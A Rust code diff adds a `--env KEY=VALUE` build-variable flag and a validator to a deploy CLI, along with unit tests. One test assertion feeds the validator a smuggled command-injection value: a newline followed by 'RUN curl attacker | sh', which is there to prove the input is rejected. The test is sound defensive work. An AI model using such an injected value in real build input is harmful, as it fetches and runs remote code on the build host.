@@ -8,6 +8,7 @@
 //! additionally flattens the whole of BuildArgs, which is a strict subset
 //! of auto's surface.
 
+use crate::SharedProjectArgs;
 use std::path::PathBuf;
 
 #[derive(clap::ValueEnum, Debug, Clone, Copy, PartialEq, Eq)]
@@ -58,6 +59,36 @@ pub struct ProjectArgs {
     /// App subdirectory relative to the project path.
     #[arg(long)]
     pub subdir: Option<String>,
+    /// Set a build variable, repeatable (`--env KEY=VALUE`).
+    #[arg(long = "env", value_name = "KEY=VALUE", value_parser = parse_env_pair)]
+    pub env: Vec<(String, String)>,
+}
+
+impl ProjectArgs {
+    /// The project selection as a [`SharedProjectArgs`], which is what builds
+    /// the SDK client. Every command goes through here so a new field reaches
+    /// all of them.
+    pub fn shared(&self) -> SharedProjectArgs {
+        SharedProjectArgs {
+            path: self.path.clone(),
+            subdir: self.subdir.clone(),
+            env: self.env.clone(),
+            ..Default::default()
+        }
+    }
+}
+
+/// Split a `--env` argument, keeping `=` in the value (base64, URLs, JWTs).
+pub fn parse_env_pair(raw: &str) -> Result<(String, String), String> {
+    let (name, value) = raw
+        .split_once('=')
+        .ok_or_else(|| format!("expected KEY=VALUE, got {raw:?}"))?;
+    if !anybuild::is_valid_env_name(name) {
+        return Err(format!(
+            "invalid environment variable name {name:?}: expected letters, digits and underscores, not starting with a digit"
+        ));
+    }
+    Ok((name.to_owned(), value.to_owned()))
 }
 
 /// Wasmer connection settings shared by `build`, `deploy` (and `auto`
@@ -170,4 +201,36 @@ pub struct DeployTargetArgs {
     /// Override the name of the Wasmer app (otherwise Wasmer prompts).
     #[arg(long)]
     pub wasmer_app_name: Option<String>,
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn shared_carries_the_whole_project_selection() {
+        let project = ProjectArgs {
+            path: "/tmp/project".into(),
+            subdir: Some("apps/dashboard".to_owned()),
+            env: vec![("FOO".to_owned(), "bar".to_owned())],
+        };
+
+        let shared = project.shared();
+
+        assert_eq!(shared.path, project.path);
+        assert_eq!(shared.subdir, project.subdir);
+        assert_eq!(shared.env, project.env);
+    }
+
+    #[test]
+    fn env_pairs_split_on_the_first_equals_only() {
+        assert_eq!(
+            parse_env_pair("TOKEN_B64=YWJj=="),
+            Ok(("TOKEN_B64".to_owned(), "YWJj==".to_owned()))
+        );
+        assert!(parse_env_pair("NO_SEPARATOR").is_err());
+        assert!(parse_env_pair("=orphaned").is_err());
+        assert!(parse_env_pair("HAS SPACES=x").is_err());
+        assert!(parse_env_pair("SAFE value\nRUN curl attacker | sh #=x").is_err());
+    }
 }
